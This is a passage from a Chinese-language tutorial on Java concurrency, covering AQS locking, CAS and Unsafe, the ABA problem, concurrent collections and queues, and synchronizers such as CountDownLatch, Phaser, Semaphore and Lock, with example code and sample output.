AbstractQueuedSynchronizer）。基于AQS的工具类：\n\nAQS底层支持独占锁和共享锁两种模式：\n\n独占锁同一时刻只能被一个线程占用，如ReentrantLock\n共享锁同一时刻可以被多个线程占用，如CountDownLatch、Semaphore等\n有的锁实现类同时实现了独占锁和共享锁两种模式：如ReentrantReadWriteLock\n\n独占锁和共享锁的实现流程独占锁模式下的加锁流程：\n独占锁加锁的入口是acquire()方法，当线程调用acquire()方法获取独占锁时，首先会调用tryAcquire()方法尝试获取锁资源，如果获取失败返回false，就会调用addWaiter()方法将当前线程封装为Node节点，添加到AQS队列的尾部。然后调用acquireQueued()方法在等待队列中排队，在acquireQueued()方法中进入一个循环逻辑：如果监测到前驱节点是head节点，就尝试获取锁，如果获取成功就将head指向当前Node节点；如果前驱节点不是head节点，就调用shouldParkAfterFailedAcquire()方法判断是否可以进入waiting状态，如果可以，就进入阻塞状态直到调用LockSupport的unpark()方法唤醒当前线程。\n独占锁模式下的解锁流程：\n独占锁模式中，释放锁的入口方法是release()，在release()方法中首先会调用tryRelease()方法尝试释放锁，如果返回true，并且head节点不为空且head节点的waitState状态不为0，会调用unparkSuccessor()方法唤醒队列最前面可以被唤醒的节点。\n共享锁模式下的加锁流程：\n共享锁加锁的入口是acquireShared()方法，当线程调用acquireShared()方法获取共享锁时，首先会调用tryAcquireShared()方法尝试获取锁资源，如果获取失败返回负数，就会调用doAcquireShared()方法将当前线程封装为Node节点，添加到AQS队列的尾部并阻塞。然后监测前驱节点是否是head节点，就尝试获取锁，如果获取成功就将head指向当前Node节点，如果同时还有剩余资源则继续唤醒队列中后面的线程；如果前驱节点不是head节点，就调用shouldParkAfterFailedAcquire()方法判断是否可以进入waiting状态，如果可以，就进入阻塞状态直到调用LockSupport的unpark()方法唤醒当前线程。\n共享锁模式下的解锁流程：\n共享锁模式中，释放锁的入口方法是releaseShared()，在release()方法中首先会调用tryReleaseShared()方法尝试释放锁，如果返回true，就执行doReleaseShared()方法唤醒队列后面的线程。\nCAS核心原理CAS的基本概念\n将内存位置的内容与给定值进行比较，只有当它们相同时，才将该内存位置的内容修改为新的给定值\n\nCAS（Compare And Swap）是一种无锁编程算法，属于乐观锁。\nCAS以原子性的方式更新共享变量的数据，能够保证线程安全。\nCAS算法的使用包含以下步骤（假设新值是基于共享变量的旧值计算得到的，比如加1操作）：\n\n读取到的共享变量的值是prev\n确定要修改的值是next（如next&#x3D;prev+1）\n再次读取共享变量的值是cur，并比较prev和cur是否一样，即计算得到next的操作前后共享变量的值是否发生了改变。如果没有发生改变就更新共享变量的值为next；如果发生了改变，则重新从第一步开始执行，或者根据需要结束执行。\n\nAtomicInteger的getAndUpdate方法的实现就体现了这一点：\npublic final int getAndUpdate(IntUnaryOperator updateFunction) &#123;    int prev, next;    do &#123;        prev = get();        next = updateFunction.applyAsInt(prev);    &#125; while (!compareAndSet(prev, next));    return prev;&#125;\n\nCAS的核心类UnsafeUnsafe类是Java中实现CAS操作的核心类，位于sun.misc包，在UnSafe类中提供了大量的native方法，通过JNI的方式调用JVM底层的C和C++实现的方法。java.util.concurrent.atomic包下提供的原子类底层操作都是基于Unsafe类实现的。\n使用Unsafe的CAS方法实现count++：\npublic class CasCountIncrement &#123;    public static Unsafe getUnsafe() &#123;        Unsafe unsafe = null;        try &#123;            Field singleOneInstanceField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);            singleOneInstanceField.setAccessible(true);            unsafe = (Unsafe) singleOneInstanceField.get(null);        &#125; catch (NoSuchFieldException | IllegalAccessException e) &#123;            e.printStackTrace();        &#125;        return unsafe;    &#125;    private static final Unsafe unsafe = getUnsafe();    private static final int THREAD_COUNT = 20;    private static final int EXECUTE_COUNT_EACH_THREAD = 500;    private volatile int count = 0;    private static long countOffset = 0;    static &#123;        try &#123;            countOffset = unsafe.objectFieldOffset(CasCountIncrement.class.getDeclaredField(&quot;count&quot;));        &#125; catch (NoSuchFieldException e) &#123;            e.printStackTrace();        &#125;    &#125;    public void incrementCountByCas() &#123;        int oldCount = 0;        do &#123;            oldCount = count;        &#125; while (!unsafe.compareAndSwapInt(this, countOffset, oldCount, oldCount + 1));    &#125;    public static void main(String[] args) throws InterruptedException &#123;        CasCountIncrement casCountIncrement = new CasCountIncrement();        CountDownLatch countDownLatch = new CountDownLatch(THREAD_COUNT);        for (int i = 0; i &lt; THREAD_COUNT; i++) &#123;            new Thread(() -&gt; &#123;                IntStream.range(0, EXECUTE_COUNT_EACH_THREAD).forEach((j) -&gt; &#123;                    casCountIncrement.incrementCountByCas();                &#125;);                countDownLatch.countDown();            &#125;).start();        &#125;;        countDownLatch.await();        System.out.println(&quot;count = &quot; + casCountIncrement.count); //count = 10000    &#125;&#125;\n\nABA问题的解决方案java中的java.util.concurrent.atomic包下提供了AtomicStampedReference类和AtomicMarkableReference类来解决ABA问题。\n区别是：\n\nAtomicStampedReference使用的是int类型的stamp，可以区分每一次的修改\nAtomicMarkableReference使用的是boolean类型的mark，只能判断有没有修改过\n\n实现源码：\n\nAtomicStampedReference：在CAS的基础上增加了stamp\n/*Params:    expectedReference – the expected value of the reference     newReference – the new value for the reference     expectedStamp – the expected value of the stamp     newStamp – the new value for the stamp*/public boolean compareAndSet(V expectedReference,                             V newReference,                             int expectedStamp,                             int newStamp) &#123;    Pair&lt;V&gt; current = pair;    return        expectedReference == current.reference &amp;&amp;        expectedStamp == current.stamp &amp;&amp;        ((newReference == current.reference &amp;&amp;          newStamp == current.stamp) ||         casPair(current, Pair.of(newReference, newStamp)));&#125;\n\nAtomicMarkableReference：在CAS的基础上增加了mark\n/*Params:    expectedReference – the expected value of the reference     newReference – the new value for the reference     expectedMark – the expected value of the mark     newMark – the new value for the mark*/public boolean compareAndSet(V expectedReference,                             V newReference,                             boolean expectedMark,                             boolean newMark) &#123;    Pair&lt;V&gt; current = pair;    return        expectedReference == current.reference &amp;&amp;        expectedMark == current.mark &amp;&amp;        ((newReference == current.reference &amp;&amp;          newMark == current.mark) ||         casPair(current, Pair.of(newReference, newMark)));&#125;\n\n同步集合同步集合指的是在对集合进行修改时，需要对整个集合加锁，保证修改的原子性和线程安全。\nVectorVector实现了List接口，底层是数组，Vector类保证方法线程安全的方式是在方法上添加synchronized关键字。\nStackStack 继承自 Vector 类，在此基础上还增加了一个栈数据结构（FILO），实现了线程安全的栈操作。\nHashtableHashtable是一个散列表类，实现了线程安全的 key-value 操作。\n同步包装器如果要讲非线程安全的集合类，如ArrayList、HashMap转换成线程安全的类，则需要使用Java提供的同步包装器。\njava.util包下的Collections类中的synchronizedXxx方法就是Java的同步包装器。\n将ArrayList对象转为同步集合类的对象，使用示例：\nList&lt;Object&gt; synchronizedList = Collections.synchronizedList(new ArrayList&lt;&gt;());\n\n同步集合的缺陷\n性能问题\n同步集合大量使用了synchroized关键字修饰整个方法，使用的是重量级锁，在部分场景下，如读多写少等，性能低。\n\n竞态条件问题\n同步集合可以保证每种方法单独操作的原子性，但是不能保证方法组合起来的复杂操作的原子性。当程序中出现复合操作时，有可能出现竞态条件问题。\n\n备注：\n竞态条件（Race Condition）是指，当两个或多个线程对同一共享资源进行读写操作时，最终的结果取决于线程执行的相对速度和调度顺序，从而导致程序出现不确定性结果的问题。\n一个经典的例子是，两个线程 T1 和 T2 同时对共享资源 X 进行读取和加 1 操作，如果 T1 先读取了 X 的值，然后进行加 1 操作，但在 T1 执行完加 1 操作前，T2 也读取了 X 的值并进行加 1 操作，然后 T1 再将自己的结果写入 X 中，这时候 X 的值就只加了 1 而不是 2，因此出现了不一致的情况。\n\n在使用同步集合进行复合操作时，对同步集合加锁，可以有效避免竞态条件问题。\n\n使用迭代器遍历问题\n使用迭代器遍历（本质上是复合操作）同步集合也会出现线程安全问题。比如两个启动线程，一个进行迭代读，另一个线程进行删除操作，就会抛出ConcurrentModificationException异常，说明在迭代读的过程中另一个线程执行了删除操作，所以，存在线程安全问题。\n解决办法也是对同步集合加锁。\n\n\n并发集合并发集合是指在对集合进行修改时，不需要对整个集合进行加锁的集合类的统称，可以支持高效的并发操作。\n并发List集合类CopyOnWriteArrayListCopyOnWriteArrayList采用了写时复制技术，即在写的时候复制一个副本。\nCopyOnWriteArrayList的底层是一个数组，对数组的读操作会直接返回原数组中的值，对数组的写操作会首先获取ReentrantLock独占锁，然后复制一份原数组的副本，在数组的副本上进行写操作，在执行完毕后，再将s狐族的副本赋值给原数组的引用array。\n可以看出，CopyOnWriteArrayList存在的缺陷有：\n\n写操作时时间、空间开销大，适合写少读多的场景。\n不能保证数据的实时一致性，因为在修改数组的过程中的如果其它线程读，读到的是原数组的值，不一定是修改后的最新值。\n\nCopyOnWriteArrayList的优点有：\n\n读取数据的性能高\n\n在使用Iterator遍历CopyOnWriteArrayList时，实际上遍历的是array引用指向的原数组。\n并发Set集合类CopyOnWriteArraySetCopyOnWriteArraySet的底层是基于CopyOnWriteArrayList实现的，所以特点和CopyOnWriteArrayList一样。\nCopyOnWriteArraySet的add方法也是直接调用了CopyOnWriteArrayList的addIfAbsent方法。\nConcurrentSkipListSet与CopyOnWriteArraySet不同的是，ConcurrentSkipListSet是有序的，并且底层不是基于CopyOnWriteArrayList，而是基于ConcurrentSkipListMap。Java1.7版本时加入。\nConcurrentSkipListSet的底层使用了跳表。跳表的实现方法是在链表的基础上加索引，每一级索引也是一个链表，通过增加索引的层级来提高查找数据的效率，并且高层索引中的节点会存在一个指向低层级索引节点的指针。使用跳表查找数据的时间复杂度是O(logn)。\n并发Map集合类ConcurrentHashMapJava1.7的 ConcurrentHashMap：\nJava1.7及之前的版本，ConcurrentHashMap使用的是Segment组、 HashEntry数组和链表实现的，结构见下图。在并发修改ConcurrentHashMap中的数据时，只会针对Segment数组中的对应元素加锁（Segment分段锁）。\n\nJava1.8的 ConcurrentHashMap：\nJava1.8及之后的版本，ConcurrentHashMap不再使用Segment分段锁 方案，而使用和HashMap相同的结构，也就是Node 数组、链表 &#x2F; 红黑树的结构，见下图，并使用CAS+synchronized锁的方式保证线程安全。在并发修改ConcurrentHashMap中的数据时，只会针对Node（实际上是Node类的子类TreeBin）数组（对象名为table）中的对应元素加锁。\n\ntable数组扩容的规则：\n\n当数组长度小于64，且链表长度大于或等于8时，进行数组扩容。\n已使用数量&#x2F;总容量的比值达到负载因子（默认是0.75，可以在构造对象的时候传入其它值作为负载因子）后，进行数组扩容。\n\n链表转红黑树的规则：\n\n当数组长度大于或等于64，且链表长度大于或等于8时，链表会转换为红黑树。\n\n红黑树转链表的规则：\n\n当链表的长度小于等于6时，红黑树会转换为链表。\n\nConcurrentHashMap的sizeCtl成员变量：\n\n在未初始化的阶段，sizeCtl记录了table数组的初始容量。\n在初始化的过程中，或在table扩容过程中，sizeCtl会被通过CAS操作赋值为-1。\n在初始化完成后，sizeCtl会记录当前table数组的扩容阈值。\n\nConcurrentSkipListMapConcurrentSkipListMap底层使用了跳表数据结构，索引节点是Index类。key是有序的。关于链表的介绍见ConcurrentSkipListSet。\n并发Queu集合类之阻塞队列并发阻塞队列概述特性\nJava中的并发阻塞队列中对于支持有界队列（可以设置队列容量）的并发阻塞队列，当队列满时会阻塞执行添加操作的线程，直到队列数据被消费，执行添加操作的线程才会被唤醒。\n当队列为空时并发阻塞队列会阻塞执行消费操作的线程，直到队列中添加了新数据，执行消费操作的线程才会被唤醒。\n并发阻塞队列可以分为单端阻塞队列和双端阻塞队列。单端阻塞队列只能向队列的一端添加数据，且只能从另一端消费数据。双端阻塞队列可以分别在队列两端添加数据或者消费数据。\nJava的除了LinkedTransferQueue（队列为空时会生成并添加一个null元素），其它所有并发阻塞队列的元素都不能为null。\n类的继承关系\nJava中的并发阻塞队列类都实现了BlockingQueue接口（LinkedTransferQueue和LinkedBlockingDeque是间接实现的，分别实现了TransferQueue和BlockingDeque接口，这些接口又继承了BlockingQueue接口），该接口规定了对于数据的添加、删除和获取有4钟不同的处理方式，分别为抛出异常、返回值、阻塞和限时返回：\n\n\n\n\nThrows exception\nSpecial value\nBlocks\nTimes out\n\n\n\nInsert\nadd(e)\noffer(e)\nput(e)\noffer(e, time, unit)\n\n\nRemove\nremove()\npoll()\ntake()\npoll(time, unit)\n\n\nExamine\nelement()\npeek()\nnot applicable\nnot applicable\n\n\n应用\n使用阻塞队列能够实现多个线程之间以线程安全的方式进行数据共享。\n并发阻塞队列有两个典型的应用案例，一个是生产者-消费者模式，另一个是按周期执行定时任务。\n\n生产者-消费者模式可以使用并发阻塞队列实现。之所以是使用并发阻塞队列，而不是非并发阻塞队列，原因是，阻塞队列能够实现消费队列没有任务时消费者线程的阻塞，有任务之后消费者线程被唤醒；而非并发阻塞队列不存在阻塞和唤醒功能。\n使用并发阻塞队列的DelayQueue可以非常方便地执行定时任务。\n\nArrayBlockingQueueArrayBlockingQueue是基于数组实现的，线程安全的有界阻塞队列，且仅支持有界，即所有构造函数都需要指定队列容量。\n支持公平和非公平两种线程访问方式。\nLinkedBlockingQueueLinkedBlockingQueue是基于链表实现的，线程安全的阻塞队列。支持无界和有界队列。\nPriorityBlockingQueuePriorityBlockingQueue是基于堆实现的，带优先级的无界阻塞队列，元素按照比较规则进行排序。支持无界和有界队列。\nDelayQueueDelayQueue是基于PriorityQueue（底层基于堆）实现的，支持延时获取数据的无界阻塞队列，元素按照过期时间进行排序。\n添加到DelayQueue中的元素必须实现Delayed接口。\nSynchronousQueueSynchronousQueue底层基于CAS实现的无界阻塞队列，内部不存储元素。对SynchronousQueue的添加操作必须等待其它线程执行删除操作，才能执行，同样的，对SynchronousQueue的删除操作也必须等待其它线程执行添加操作。\n支持公平和非公平两种线程访问方式。\nLinkedTransferQueueLinkedTransferQueue是由链表实现的无界阻塞队列，实现了TransferQueue接口，TransferQueue接口继承了BlockingQueue接口，相比其它阻塞队列多了tryTransfer和transfer等方法。\nLinkedTransferQueu采用预占模式读写数据。\n在消费者线程从LinkedTransferQueue中获取数据时，如果LinkedTransferQueue中存在数据，则直接获取数据并返回。如果LinkedTransferQueue为空，就会生成一个元素为null的节点添加到LinkedTransferQueue中，并且消费者会在这个节点上阻塞等待；在后续生产者线程调用transfer方法时，不会将数据添加到LinkedTransferQueue中，而是将数据直接传递给消费者线程。\n在生产者线程调用transfer方法时，如果未发现有在LinkedTransferQueue节点上等待的消费者线程，就会将数据添加到LinkedTransferQueue中，然后阻塞等待，直到有其他消费者线程获取添加的元素。\nLinkedBlockingDequeLinkedBlockingDeque是一个基于双向链表实现的双向阻塞队列，能够从队列两端添加和删除数据，支持先进先出和先进后出。支持无界和有界队列。\n创建LinkedBlockingDeque时可以指定容量，如果不指定，则默认队列的容量是Integer.MAX_VALUE。\n并发Queu集合类之非阻塞队列并发非阻塞队列概述并发阻塞队列的实现大都基于ReentrantLock锁，与并发阻塞队列不同的是，并发非阻塞队列是基于CAS自旋锁实现的，在并发非阻塞队列上读写数据时，线程不会阻塞。\n并发非阻塞队列可以分为单端非阻塞队列和双端非阻塞队列。\n类的继承关系\n并发非阻塞队列都实现了Queue接口，并且都是基于链表实现的无界队列。\nJava中的并发非阻塞队列类都实现了Queue接口（ConcurrentLinkedDeque是间接实现，ConcurrentLinkedDeque实现了Deque接口，该接口又继承了Queue接口），该接口规定了对于数据的添加、删除和获取有2钟不同的处理方式，分别为抛出异常和返回值：\n\n\n\n\nThrows exception\nReturns special value\n\n\n\nInsert\nadd(e)\noffer(e)\n\n\nRemove\nremove()\npoll()\n\n\nExamine\nelement()\npeek()\n\n\nConcurrentLinkedQueueConcurrentLinkedQueue是基于链表实现的无界非阻塞队列，没有保存队列的元素数量，其size操作是通过遍历计算元素数量实现的。\nConcurrentLinkedDequeConcurrentLinkedDeque是基于链表实现的无界非阻塞队列，没有保存队列的元素数量。\n并发工具类并发工具类是一组用于帮助管理多线程并发操作的类。它们提供了例如线程同步、线程通信和控制线程执行的顺序等功能。\nCountDownLatchCountDownLatch能够实现一个或多个线程，等待其它所有线程完成某种操作后再执行。\nCountDownLatch是基于AQS（AbstractQueuedSynchronizer）实现的，调用CountDownLatch的await方法的线程，会被加入到AQS的阻塞队列中等待。\nCountDownLatch维护了一个计数器，记录未完成某种操作的线程数量，随构造函数传入初始值，调用countDown方法时计数器的值减1，当计数器的值减到0时，阻塞的线程会被唤醒。CountDownLatch的计数器值不能被重置。\n使用示例：\npublic class CountDownLatchArrivalTask implements Runnable &#123;    private final String name;    private final CountDownLatch countDownLatch;    public CountDownLatchArrivalTask(String name, CountDownLatch countDownLatch) &#123;        this.name = name;        this.countDownLatch = countDownLatch;    &#125;    @Override    public void run() &#123;        System.out.println(name + &quot; has arrived.&quot;);        countDownLatch.countDown();    &#125;&#125;\n\npublic class CountDownLatchWaitingTask implements Runnable &#123;    private String name;    private CountDownLatch countDownLatch;    public CountDownLatchWaitingTask(String name, CountDownLatch countDownLatch) &#123;        this.name = name;        this.countDownLatch = countDownLatch;    &#125;    @Override    public void run() &#123;        try &#123;            System.out.println(name + &quot; is waiting for tourists.&quot;);            countDownLatch.await();            System.out.println(&quot;The tour can begin.&quot;);        &#125; catch (InterruptedException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;&#125;\n\npublic class CountDownLatchTest &#123;    public static void main(String[] args) &#123;        CountDownLatch countDownLatch = new CountDownLatch(2);        new Thread(new CountDownLatchWaitingTask(&quot;Tourist guide&quot;, countDownLatch)).start();        new Thread(new CountDownLatchArrivalTask(&quot;Tourist Amy&quot;, countDownLatch)).start();        new Thread(new CountDownLatchArrivalTask(&quot;Tourist Sam&quot;, countDownLatch)).start();    &#125;&#125;/**运行输出：Tourist Amy has arrived.Tourist guide is waiting for tourists.Tourist Sam has arrived.The tour can begin.*///&quot;The tour can begin.&quot;总是最后执行\n\n在这个例子中，有一个旅游团的导游和两个游客（CountDownLatch对象的计数器被初始化为2），导游需要等待所有游客到达（导游线程调用await方法）后才开始旅游，每个游客线程在到达后会调用countDown()方法来减少CountDownLatch对象的计数器，当计数器值减为0，await之后的代码继续执行。\nCyclicBarrierCyclicBarrier的功能是对CountDownLatch工具类的增强。\nCyclicBarrier的计数器可以被自动重置（在计数器减为0后，会自动重置为创建CyclicBarrier对象时的初始值），还能够实现多个线程之间互相的计数等待。\n构造CyclicBarrier时，除了可以传入计数器的初始值，还可以传入一个实现了Runnable接口的类对象（有两种构造器），当计数器值减为0时，会自动调用Runnale接口对象的run方法。\n使用示例：\npublic class CyclicBarrierTask implements Runnable &#123;    private final String task;    private final CyclicBarrier cyclicBarrier;    public CyclicBarrierTask(String task, CyclicBarrier cyclicBarrier) &#123;        this.task = task;        this.cyclicBarrier = cyclicBarrier;    &#125;    @Override    public void run() &#123;        //模拟了三个任务        IntStream.rangeClosed(1, 3).forEach((i) -&gt; &#123;            try &#123;                System.out.println(&quot;完成&quot; + task + &quot;的操作；&quot;);                cyclicBarrier.await();            &#125; catch (InterruptedException | BrokenBarrierException e) &#123;                throw new RuntimeException(e);            &#125;        &#125;);    &#125;&#125;\n\npublic class CyclicBarrierTest &#123;    public static void main(String[] args) throws InterruptedException &#123;        CyclicBarrier cyclicBarrier = new CyclicBarrier(2, () -&gt; &#123;            System.out.println(&quot;当前提交订单、扣减库存完成&quot;);        &#125;);        //提交订单和扣减库存的操作会互相等待        new Thread(new CyclicBarrierTask(&quot;提交订单&quot;, cyclicBarrier)).start();        new Thread(new CyclicBarrierTask(&quot;扣减库存&quot;, cyclicBarrier)).start();    &#125;&#125;\n\n在这个例子中，模拟了三个任务，每个任务都分别包含提交订单、扣减库存两个操作。如果使用CyclicBarrier，则只需要创建一个CyclicBarrier对象，每个任务执行完毕后CyclicBarrier会自动重置计数器的值，继续执行下一个任务。\nPhaserPhaser的功能类似于CountDownLatch和CyclicBarrier的集合。\nPhaser适用于将一个大任务拆分为多个小任务，拆分后的每个小任务都可以并发执行，且上一个大任务完成才可以执行下一个大任务。这种场景使用CountDownLatch和CyclicBarrier也能实现，但是使用Phaser会更灵活。\n使用示例：\npublic class PhaserDinner extends Phaser &#123;    @Override    protected boolean onAdvance(int phase, int registeredParties) &#123;        //return if this phaser should terminate        return switch (phase) &#123;            case 0 -&gt; allArrive();            case 1 -&gt; allOrderedMeal();            case 2 -&gt; allOrderedDrink();            default -&gt; true;        &#125;;    &#125;    private boolean allOrderedDrink() &#123;        System.out.println(&quot;所有人都点完了饮料&quot;);        return false;    &#125;    private boolean allOrderedMeal() &#123;        System.out.println(&quot;所有人都点完了菜&quot;);        return false;    &#125;    private boolean allArrive() &#123;        System.out.println(&quot;所有人都到齐了&quot;);        return false;    &#125;&#125;\n\npublic class PhaserTask implements Runnable&#123;    private final String name;    private final Phaser phaser;    private final String meal;    private final String drink;    public PhaserTask(String name, Phaser phaser, String meal, String drink) &#123;        this.name = name;        this.phaser = phaser;        this.meal = meal;        this.drink = drink;    &#125;    @Override    public void run() &#123;        //到达聚餐地点        System.out.println(name + &quot;到达聚餐地点&quot;);        phaser.arriveAndAwaitAdvance(); //等待其它线程到达        //点菜        System.out.println(name + &quot;点了一份&quot; + meal);        phaser.arriveAndAwaitAdvance();        //点饮料        System.out.println(name + &quot;点了一份&quot; + drink);        phaser.arriveAndAwaitAdvance();    &#125;&#125;\n\npublic class PhaserTest &#123;    public static void main(String[] args) &#123;        PhaserDinner phaserDinner = new PhaserDinner();        new Thread(new PhaserTask(&quot;Amy&quot;, phaserDinner, &quot;hamburg&quot;, &quot;cola&quot;)).start();        phaserDinner.register();        new Thread(new PhaserTask(&quot;Sam&quot;, phaserDinner, &quot;sandwich&quot;, &quot;coffee&quot;)).start();        phaserDinner.register();    &#125;&#125;/**输出结果：Amy到达聚餐地点Sam到达聚餐地点所有人都到齐了Amy点了一份hamburgSam点了一份sandwich所有人都点完了菜Sam点了一份coffeeAmy点了一份cola所有人都点完了饮料*/\n\n在这个例子中，场景是等待所有人到达后点菜，所有人点完蔡后点饮料，要开启下一阶段（到达 -&gt; 点菜 -&gt; 点饮料），需要所有线程都完成上一阶段。PhaserTask类定义了整个阶段每个阶段的任务，阶段之间使用phaser.arriveAndAwaitAdvance()等待所有线程执行完之前的代码，PhaserDinner类是Phaser接口的实现类，覆盖了onAdvance方法，定义了每个阶段完成后执行的操作以及返回是否继续使用Phaser（Phaser是否继续生效）。\nSemaphoreSemaphore可以限制同时访问某一资源的线程数量，相当于一个共享锁，允许多个线程同时拥有一定数量的信号量许可（permits）。\nSemaphore提供了公平信号量与非公平信号量两种模式。\n使用示例：\npublic class SemaphoreTask implements Runnable&#123;    private final Semaphore semaphore;    public SemaphoreTask(Semaphore semaphore) &#123;        this.semaphore = semaphore;    &#125;    @Override    public void run() &#123;        try &#123;            semaphore.acquire(); //获取信号量许可            DateTimeFormatter formatter = DateTimeFormatter.ofPattern(&quot;HH:mm:ss&quot;);            System.out.println(Thread.currentThread().getName() + &quot; 获取到许可，执行时间为 &quot; + LocalTime.now().format(formatter));            Thread.sleep(2000);            semaphore.release(); //释放许可        &#125; catch (InterruptedException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;&#125;\n\npublic class SemaphoreTest &#123;    public static void main(String[] args) &#123;        Semaphore semaphore = new Semaphore(2); //创建了一个信号量许可数量为2的非公平的Semaphore对象        int threadNum = 6;        ExecutorService threadPool = Executors.newFixedThreadPool(threadNum);        IntStream.range(0, threadNum).forEach((i) -&gt; &#123;            threadPool.submit(new SemaphoreTask(semaphore));        &#125;);    &#125;&#125;/**输出结果：pool-1-thread-2 获取到许可，执行时间为 10:40:52pool-1-thread-4 获取到许可，执行时间为 10:40:52pool-1-thread-6 获取到许可，执行时间为 10:40:54pool-1-thread-1 获取到许可，执行时间为 10:40:54pool-1-thread-3 获取到许可，执行时间为 10:40:56pool-1-thread-5 获取到许可，执行时间为 10:40:56*/\n\n在这个例子中，创建了一个信号量许可数量为2的非公平的Semaphore对象，和一个线程数为6的线程池，线程执行的是SemaphoreTask类实现的run方法，run方法中有一个两秒钟的睡眠，从输出结果中可以看到，每两秒的时间内只有两个线程能够执行。\nExchangerExchanger能够实现两个线程之间的数据交换。当一个线程调用了Exchanger对象的exchange方法，就会进入阻塞状态，直到另一个线程也调用了exchange方法后，两个线程会交换数据，然后继续执行。\n使用示例：\npublic class ExchangerTask&lt;T&gt; implements Runnable &#123;    Exchanger&lt;T&gt; exchanger;    T object;    public ExchangerTask(Exchanger&lt;T&gt; exchanger, T object) &#123;        this.exchanger = exchanger;        this.object = object;    &#125;    @Override    public void run() &#123;        try &#123;            T getFromExchanger = exchanger.exchange(object);            DateTimeFormatter formatter = DateTimeFormatter.ofPattern(&quot;HH:mm:ss&quot;);            System.out.println(getFromExchanger.toString() + &quot;完成的时间为 &quot; + LocalTime.now().format(formatter));        &#125; catch (InterruptedException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;&#125;\n\npublic class ExchangerTest &#123;    public static void main(String[] args) throws InterruptedException &#123;        Exchanger&lt;String&gt; exchanger = new Exchanger&lt;&gt;();        new Thread(new ExchangerTask&lt;&gt;(exchanger, &quot;付款&quot;)).start(); //先启动了付款线程        Thread.sleep(2000); //在付款和交付之间加入时间间隙，以验证Exchanger的作用        new Thread(new ExchangerTask&lt;&gt;(exchanger, &quot;交付&quot;)).start(); //两秒后启动交付线程    &#125;&#125;/**输出结果：付款完成的时间为 11:54:54交付完成的时间为 11:54:54*/\n\n在这个示例中，使用了两个线程模拟了商品付款的交付的过程，使用了Exchanger实现了线程间的等待和数据交换。虽然付款线程最先启动，两秒后才启动交付线程，但是由于Exchanger的exchange机制，实现了两个线程共同执行完exchange，交换完毕数据之后，才继续后续任务。\n锁工具类锁工具类是用于实现线程同步和互斥访问的工具。它们提供了一种机制，允许线程对共享资源进行独占访问，以确保数据的一致性和正确性。\nLock接口Lock接口是Java从1.5版本开始提供的显示锁接口。位于java.util.concurrent.locks包下：\n\nLock接口在声明了以下方法：\n\nvoid lock()：无条件地获取锁。如果锁不可用，则当前线程会被阻塞，直到获取到锁为止。\n\nvoid lockInterruptibly() throws InterruptedException：获取锁，但是允许响应中断。如果锁不可用，当前线程会进入阻塞状态，直到获取到锁或者当前线程被中断。\n\nboolean tryLock()：尝试获取锁，如果锁可用，则立即获取锁，并返回true。如果锁不可用，则立即返回false，而不会阻塞当前线程。\n\nboolean tryLock(long time, TimeUnit unit) throws InterruptedException：在给定的时间范围内尝试获取锁。如果在指定时间内获取到锁，则返回true，否则返回false。如果获取锁超时，当前线程可能会被阻塞，直到获取到锁或者超时时间到达。\n\nvoid unlock()：释放锁。必须在获取锁之后才能调用此方法，否则会抛出IllegalMonitorStateException异常。\n\nCondition newCondition()：获取与锁关联的条件对象。可以使用条件对象进行线程的等待和通知。\n\n\n\nLock锁（继承了Lock接口的锁工具类的统称）比synchronized锁更灵活\n\nLock锁中的ReadWriteLock可以实现读读不互斥。\nLock锁可以实现在没有获取到锁的情况下直接返回。\nLock锁支持超时机制。\nLock锁支持可中断。\nLock锁支持公平锁。\n\nLock锁的使用方法是，首先创建一个Lock对象，调用加锁方法进行加锁，然后在try代码块中实现业务代码，在catch代码块中处理异常，最后在finally代码块中释放锁资源。\nlock.lock()是写在try里面还是外面\n在使用 Lock 的时候，通常建议将 lock.lock(); 写在 try 块的外面，然后在 finally 块中释放锁。例如：\nLock lock = new ReentrantLock();lock.lock();try &#123;    // access shared resources&#125; finally &#123;    lock.unlock();&#125;\n\n这样做的原因是，如果获取锁（lock.lock()）失败抛出了异常，那么在 finally 块中就无需（也不能）去释放这个锁。如果将 lock.lock(); 如果写在 try 块内部，当获取锁抛出异常时，finally 块仍然会执行，这可能会导致尝试释放一个实际上并未被当前线程持有的锁，从而引发 IllegalMonitorStateException。\n然而，需要注意的是，这种模式主要适用于 lock.lock() 不会抛出受检异常的情况。在 Lock 接口中，lock() 方法正是不会抛出受检异常的。但如果你使用的锁实现可能会在 lock() 方法中抛出受检异常，那么你可能需要将 lock() 调用放入 try 块中，并在 catch 块中适当地处理异常。\n使用示例：\npublic class LockTask implements Runnable &#123;    Lock lock;    public LockTask(Lock lock) &#123;        this.lock = lock;    &#125;    @Override    public void run() &#123;        lock.lock();        try &#123;            System.out.println(Thread.currentThread().getName() + &quot;线程获取到锁&quot;);            System.out.println(Thread.currentThread().getName() + &quot;线程执行任务&quot;);        &#125; finally &#123;            System.out.println(Thread.currentThread().getName() + &quot;线程释放锁&quot;);            lock.unlock();        &#125;    &#125;&#125;\n\npublic class LockTest &#123;    public static void main(String[] args) &#123;        Lock lock = new ReentrantLock();        IntStream.range(0, 5).forEach((i) -&gt; &#123;            new Thread(new LockTask(lock)).start();        &#125;);    &#125;&#125;/**输出结果：Thread-0线程获取到锁Thread-0线程执行任务Thread-0线程释放锁Thread-2线程获取到锁Thread-2线程执行任务Thread-2线程释放锁Thread-4线程获取到锁Thread-4线程执行任务Thread-4线程释放锁Thread-3线程获取到锁Thread-3线程执行任务Thread-3线程释放锁Thread-1线程获取到锁Thread-1线程执行任务Thread-1线程释放锁*/\n\n在这个例子中，创建了一个Runnable的实现类LockTask，LockTask中使用了Lock锁，确保了run方法中打印的顺序是以线程为单位的，同一时刻只有一个线程能访问临界区资源，并完整地执行完获取锁和释放锁。\nCondition接口使用Condition接口的wait、signal和signalAll方法结合Lock锁使用可以实现线程间的等待与通知（即线程间的通信）。这种功能类似使用Java的Object类提供的wait、notify和notifyAll方法结合synchronized实现对象的等待和通知，如：\n//Object类j提供的wait、notify和notifyAll方法结合且必须结合synchronized实现对象的等待和通知private final Object obj = new Object();public void testWait() throws InterruptedException &#123;    synchronized(obj) &#123;        obj.wait();    &#125;&#125;public void testNotify() &#123;    synchronized (obj) &#123;        obj.notify();    &#125;&#125;public void testNotifyAll() &#123;    synchronized (obj) &#123;        obj.notifyAll();    